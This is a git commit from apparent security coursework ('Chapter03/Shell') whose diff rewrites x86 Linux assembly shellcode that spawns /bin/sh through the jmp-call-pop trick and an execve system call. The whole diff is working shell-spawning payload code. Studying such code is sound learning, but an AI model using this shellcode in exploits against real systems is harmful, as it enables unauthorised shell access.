0f063ac2f58cd3abcb9ea299103e2a207cda324f
Eric Murphy <murph141@purdue.edu>
2015-06-02 23:48:05 -0700

    Shellcode is working

--- Chapter03/Shell/shell.s
+++ Chapter03/Shell/shell.s
@@ -1,27 +1,23 @@
 .text
 
-.globl _start
-
-_start:
-
-  jmp GotoCall
-
-shellcode:
-
-  popl %ebp
-  xorl %eax, %eax
-  movb %al, 7(%ebp)
-  leal (%ebp), %ebx
-  movl %ebx, 8(%ebp)
-  movl %eax, 12(%ebp)
-  movb $0x0b, %al
-  movl %ebp, %ebx
-  leal 8(%ebp), %ecx
-  leal 12(%ebp), %edx
-  int $0x80
-
-GotoCall:
-
-  call shellcode
-
-  .asciz "/bin/shABBBBCCCC"
+  .globl _start
+  
+  _start:
+    jmp GotoCall
+  
+  shellcode:
+    popl %esi
+    xorl %eax, %eax
+    movb %al, 7(%esi)
+    leal -0x0(%esi), %ebx
+    movl %ebx, 8(%esi)
+    movl %eax, 12(%esi)
+    movb $0x0b, %al
+    movl %esi, %ebx
+    leal 8(%esi), %ecx
+    leal 12(%esi), %edx
+    int $0x80
+  
+  GotoCall:
+    call shellcode
+    .ascii "/bin/shJAAAAKKKK"
